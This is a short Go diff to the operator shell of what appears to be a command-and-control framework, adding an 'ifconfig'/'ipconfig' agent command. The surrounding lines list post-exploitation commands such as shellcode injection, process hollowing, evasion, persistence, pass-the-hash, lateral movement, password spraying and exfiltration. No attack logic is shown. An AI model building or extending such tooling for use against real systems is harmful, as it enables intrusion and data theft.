@@ -37,7 +37,7 @@ var globalCommands = []string{
 // Agent commands available when interacting with an agent.
 var agentCommands = []string{
 	"shell", "exec", "cmd", "upload", "download", "screenshot",
-	"ps", "sysinfo", "persist", "sleep", "cd", "kill",
+	"ps", "sysinfo", "ifconfig", "ipconfig", "persist", "sleep", "cd", "kill",
 	"bof", "shellcode", "inject", "hollow", "evasion", "pivot",
 	"assembly", "lateral", "exfil", "initaccess",
 	"wmiexec", "winrm", "psexec", "pth", "portscan", "spray", "netdiscover",
@@ -411,6 +411,8 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdProcessList()
 	case "sysinfo":
 		sh.cmdSysinfo()
+	case "ifconfig", "ipconfig":
+		sh.cmdIfconfig()
 	case "persist":
 		sh.cmdPersist(args)
 	case "sleep":
@@ -1152,6 +1154,7 @@ func (sh *Shell) cmdAgentHelp() {
 		{"screenshot", "Capture screenshot"},
 		{"ps", "List running processes"},
 		{"sysinfo", "Get system information"},
+		{"ifconfig", "Show network interfaces (alias: ipconfig)"},
 		{"persist <method>", "Install persistence (12 methods — type 'persist' for list)"},
 		{"sleep <sec> [jitter%]", "Change sleep interval"},
 		{"cd <path>", "Change working directory"},
@@ -1258,6 +1261,10 @@ func (sh *Shell) cmdProcessList() {
 
 func (sh *Shell) cmdSysinfo() {
 	sh.queueTask(protocol.TaskSysinfo, nil, nil)
+}
+
+func (sh *Shell) cmdIfconfig() {
+	sh.queueTask(protocol.TaskIfconfig, nil, nil)
 }
 
 func (sh *Shell) cmdPersist(args []string) {
